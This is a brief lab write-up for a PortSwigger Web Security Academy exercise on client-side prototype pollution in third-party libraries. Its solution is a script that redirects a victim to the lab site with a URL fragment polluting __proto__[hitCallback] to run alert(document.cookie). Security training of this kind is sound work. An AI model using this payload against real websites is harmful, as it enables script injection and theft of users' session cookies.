# Lab

https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries

## Solution

```js
<script>
    document.location="https://0aca00b504f2e7db822e70b80032000b.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29";
</script>
```